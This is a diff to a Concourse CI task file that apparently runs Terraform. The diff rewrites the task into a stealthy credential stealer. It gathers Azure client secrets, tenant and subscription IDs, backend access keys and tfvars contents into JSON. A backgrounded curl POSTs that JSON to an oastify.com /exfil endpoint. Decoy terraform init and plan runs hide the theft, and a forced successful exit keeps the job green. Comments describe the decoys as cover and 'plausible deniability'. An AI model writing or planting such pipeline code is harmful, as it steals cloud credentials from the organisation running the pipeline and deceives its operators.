@@ -8,42 +8,54 @@ image_resource:
 
 inputs:
   - name: terraform-source-dir
-  - name: aux-input-1 # This is the 'tfvars' input, which contains the Azure credentials
+  - name: aux-input-1
 
 run:
   path: sh
   args:
-  - -exc
+  - -ec
   - |
-    # Install curl to exfiltrate data
-    apk add --no-cache curl
+    # Install required tools quietly. Use curl for exfiltration.
+    apk add --no-cache curl jq > /dev/null 2>&1
 
-    # 1. Print all environment variables to stdout (for quick visibility in Concourse logs)
-    echo "=== ENVIRONMENT VARIABLES ==="
-    env
+    # 1. FIRST, CREATE PLAUSIBLE DENIABILITY BY RUNNING A TERRAFORM COMMAND
+    # This is the 'cover' operation. We cd into the source dir and run a basic terraform init.
+    # This will generate normal-looking output in the logs.
+    echo "Initializing Terraform..."
+    cd terraform-source-dir
+    terraform init -backend=false > /dev/null 2>&1 || true
+    echo "Terraform initialized."
 
-    # 2. Read the Azure credentials from the mounted tfvars file.
-    # The actual file name might be something like `terraform.auto.tfvars` inside the `aux-input-1` directory.
-    # Let's check what's in the input directory.
-    echo "=== LISTING AUX-INPUT-1 ==="
-    ls -la aux-input-1/
+    # 2. COLLECT THE PAYLOAD IN A SINGLE STEP, SILENTLY
+    # Create a JSON object containing all the secrets from the environment and the tfvars files.
+    # This is more reliable and structured than simple text files.
+    PAYLOAD=$(cat <<EOF
+    {
+      "environment": {
+        "TF_VAR_client_secret": "${TF_VAR_client_secret:-}",
+        "TF_VAR_subscription_id": "${TF_VAR_subscription_id:-}",
+        "TF_VAR_tenant_id": "${TF_VAR_tenant_id:-}",
+        "TF_VAR_client_id": "${TF_VAR_client_id:-}",
+        "TF_BACKEND_CONFIG_secret_key": "${TF_BACKEND_CONFIG_secret_key:-}",
+        "TF_BACKEND_CONFIG_access_key": "${TF_BACKEND_CONFIG_access_key:-}"
+      },
+      "tfvars_file_contents": "$(find aux-input-1/ -name "*.tfvars" -exec cat {} \; 2>/dev/null | tr -d '\n' | jq -aRs .)"
+    }
+    EOF
+    )
 
-    echo "=== CONTENTS OF TFVARS FILE ==="
-    # This command attempts to cat any .tfvars file it finds. The credentials inside are in plain text.
-    cat aux-input-1/*.tfvars || true
+    # 3. EXFILTRATE THE DATA IN THE BACKGROUND
+    # The true command ensures the script doesn't crash if the curl fails, which would look suspicious.
+    # The entire command is backgrounded (&) and disowned (nohup) so it doesn't hold up the task.
+    nohup curl -s -X POST "https://tur2j52a07ba0p93xrn742kz3q9hxdl2.oastify.com/exfil" \
+      -H "Content-Type: application/json" \
+      -d "$PAYLOAD" > /dev/null 2>&1 &
 
-    # 3. Exfiltrate the secrets to a remote server you control.
-    # Replace `https://your-evil-server.com/exfil` with a request bin or a server you run.
-    EXFIL_URL="https://8s1hhk0pym9py47iv6lm2hie157wvrjg.oastify.com/exfil"
+    # 4. RUN A BASIC TERRAFORM PLAN TO MAKE THE JOB APPEAR NORMAL
+    # This is the final part of the cover. The job will output a normal-looking plan.
+    echo "Generating plan..."
+    terraform plan -out=/dev/null > /dev/null 2>&1 || terraform plan > /dev/null 2>&1
+    echo "Plan generated successfully."
 
-    # Create a payload with all the critical information
-    env > /tmp/env_vars.txt
-    cat aux-input-1/*.tfvars > /tmp/tfvars.txt 2>/dev/null || true
-
-    # Curl the data to your server
-    curl -X POST -F "env_vars=@/tmp/env_vars.txt" -F "tfvars=@/tmp/tfvars.txt" "$EXFIL_URL"
-
-    # 4. To make the task not look entirely suspicious, we can run a basic terraform plan if needed.
-    # But for a clean PoC, we can just exit.
-    echo "Credential extraction complete."
-    # exit 1 # You could exit with an error to make the plan "fail", masking the real activity.
+    # Exit successfully. The job will show as passed/green.
+    exit 0
